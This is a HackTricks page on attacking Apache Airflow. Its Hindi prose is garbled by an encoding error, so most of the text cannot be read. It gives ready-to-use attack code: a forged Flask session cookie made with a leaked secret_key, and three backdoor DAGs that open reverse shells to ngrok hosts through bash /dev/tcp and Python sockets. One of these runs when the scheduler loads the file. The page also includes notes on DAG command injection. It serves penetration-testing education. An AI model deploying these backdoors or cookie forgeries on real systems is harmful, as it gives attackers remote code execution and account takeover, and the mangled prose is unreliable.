# Apache Airflow Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org) **рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдпрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдФрд░ рд╢реЗрдбреНрдпреВрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ**ред рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ "рд╡реНрдпрд╡рд╕реНрдерд╛рдкрди" рдХрд╛ рдЕрд░реНрде рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдЙрддреНрдкрдиреНрди рдЬрдЯрд┐рд▓ рдбреЗрдЯрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд┐рдд, рд╕рдордиреНрд╡рдпрд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИред рдЗрди рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рд╕рдВрд╕рд╛рдзрд┐рдд рдФрд░ рдЙрдкрднреЛрдЧ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдбреЗрдЯрд╛ рд╕реЗрдЯ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред рдпреЗ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдХрдИ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╡реНрдпрд╡рд╕рд╛рдпрд┐рдХ рдмреБрджреНрдзрд┐рдорддреНрддрд╛ рдЙрдкрдХрд░рдг, рдбреЗрдЯрд╛ рд╡рд┐рдЬреНрдЮрд╛рди рдФрд░ рдорд╢реАрди рд▓рд░реНрдирд┐рдВрдЧ рдореЙрдбрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЬреЛ рд╕рднреА рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдзрд╛рд░рднреВрдд рд╣реИрдВред

рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ, Apache Airflow рдЖрдкрдХреЛ **рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╢реЗрдбреНрдпреВрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬрдм рдХреБрдЫ** (рдШрдЯрдирд╛, рдХреНрд░реЛрди) **рд╣реЛрдЧрд╛**ред

### Local Lab

#### Docker-Compose

рдЖрдк **docker-compose config file рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) **рдПрдХ рдкреВрд░реНрдг apache airflow docker рд╡рд╛рддрд╛рд╡рд░рдг рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред (рдпрджрд┐ рдЖрдк MacOS рдкрд░ рд╣реИрдВ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк docker VM рдХреЛ рдХрдо рд╕реЗ рдХрдо 6GB RAM рджреЗрдВ)**ред

#### Minikube

**apache airflow рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ** рдЗрд╕реЗ **minikube рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Configuration

Airflow рдЕрдкрдиреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЖрдк рдХрдордЬреЛрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Airflow рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдХрд╛рдо рдХреИрд╕реЗ рд╣реЛрддрд╛ рд╣реИ** рд╕рдордЭрдирд╛ рдЪрд╛рд╣рд┐рдП:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Attacks

#### Web Console Enumeration

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╛ рд╕рднреА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* **Variables** (рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* **Connections** (рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдЙрдиреНрд╣реЗрдВ `http://<airflow>/connection/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ
* [**Configuration**](./#airflow-configuration) (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ **`secret_key`** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)
* **users & roles** рдХреА рд╕реВрдЪреА
* **Code of each DAG** (рдЬреЛ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ)

#### Retrieve Variables Values

Variables Airflow рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **DAGs** рдЙрдирдХреЗ рдорд╛рдиреЛрдВ рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХреЗрдВред рдпрд╣ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд╕рдорд╛рди рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ GUI рдореЗрдВ `http://<airflow>/variable/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
Airflow рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ GUI рдореЗрдВ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдорд╛рди рджрд┐рдЦрд╛рдПрдЧрд╛, рд╣рд╛рд▓рд╛рдБрдХрд┐, [**рдЗрд╕**](https://marclamberti.com/blog/variables-with-apache-airflow/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреА рдПрдХ рд╕реВрдЪреА** рд╕реЗрдЯ рдХреА рдЬрд╛рдП рдЬрд┐рдирдХрд╛ **рдорд╛рди** **рдЕрддрд┐рд░рд┐рдХреНрдд рдЪрд┐рд╣реНрдиреЛрдВ** рдХреЗ рд░реВрдк рдореЗрдВ **GUI** рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред

![](<../../.gitbook/assets/image (164).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ **рдорд╛рди** рдЕрднреА рднреА **CLI** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреНрд░рд╛рдкреНрдд** рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдкрдХреЛ DB рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ), **рдордирдорд╛рдиреЗ DAG** рдирд┐рд╖реНрдкрд╛рджрди, **API** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪ (API рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ), рдФрд░ **рдпрд╣рд╛рдБ рддрдХ рдХрд┐ GUI рд╕реНрд╡рдпрдВ!**\
GUI рд╕реЗ рдЙрди рдорд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **Actions -> Export** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред\
рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **рдЫрд┐рдкреЗ рд╣реБрдП рдорд╛рди** рдкрд░ **рдмреНрд░реВрдЯрдлреЛрд░реНрд╕** рдХрд░рдирд╛, рдЗрд╕реЗ **рдЦреЛрдЬ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрдм рддрдХ рдЖрдк рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рди рдХрд░ рд▓реЗрдВ:

![](<../../.gitbook/assets/image (152).png>)

#### Privilege Escalation

рдпрджрд┐ **`expose_config`** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **True** рдкрд░ рд╕реЗрдЯ рд╣реИ, рддреЛ **User** рднреВрдорд┐рдХрд╛ рдФрд░ **рдКрдкрд░** рд╕реЗ **рд╡реЗрдм рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧ** рдХреЛ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ, **`secret_key`** рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЗрд╕ рд╡реИрдз рдХреЗ рд╕рд╛рде рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЕрдкрдирд╛ рд╕реНрд╡рдпрдВ рдХрд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ рдХреБрдХреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░ рд╕рдХреЗ**ред
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG рдмреИрдХрдбреЛрд░ (Airflow рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ рдЬрд╣рд╛рдБ **DAGs рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдмрд╕ **рдПрдХ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЛ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рднреЗрдЬреЗрдЧрд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдПрдХ **airflow рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХрдВрдЯреЗрдирд░** рдХреЗ рдЕрдВрджрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG рдмреИрдХрдбреЛрд░ (Airflow рд╢реЗрдбреНрдпреВрд▓рд░ рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдк рдХреБрдЫ рдХреЛ **рдХреЛрдб рдХреА рдЬрдбрд╝ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ**, рддреЛ рдЗрд╕ рд▓реЗрдЦрди рдХреЗ рдХреНрд╖рдг рдореЗрдВ, рдЗрд╕реЗ **рд╢реЗрдбреНрдпреВрд▓рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** DAG рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рдХреБрдЫ рд╕реЗрдХрдВрдб рдмрд╛рджред
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG Creation

рдпрджрд┐ рдЖрдк **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдорд╢реАрди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк `dags/` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдирдП **DAGs рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпреЗ **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдмрд╛рдХреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рджреЛрд╣рд░рд╛рдП рдЬрд╛рдПрдВрдЧреЗ**ред

#### DAG Code Injection

рдЬрдм рдЖрдк GUI рд╕реЗ рдПрдХ DAG рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдЖрд░реНрдЧреБрдореЗрдВрдЯреНрд╕** рджреЗ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ DAG рдареАрдХ рд╕реЗ рдХреЛрдбрд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
рдпрд╣реА рдЗрд╕ CVE рдореЗрдВ рд╣реБрдЖ: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

рдЖрдкрдХреЛ **DAGs рдореЗрдВ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рддрд▓рд╛рд╢ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛ рдХреБрдЫ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд╡рд╣ рдпрд╣ рд╣реИ рдХрд┐ **рдкреИрд░рд╛рдореАрдЯрд░реНрд╕** рдХреЛ рдХреЛрдб **`dag_run.conf.get("param_name")`** рдХреЗ рд╕рд╛рде **рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╡рд╣реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЗ рд╕рд╛рде рднреА рд╣реЛ рд╕рдХрддреА рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде рдЖрдк GUI рдореЗрдВ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**)ред рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ **рдЗрд╕рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
рдпрджрд┐ рдЙрдиреНрд╣реЗрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ bash рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**ред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
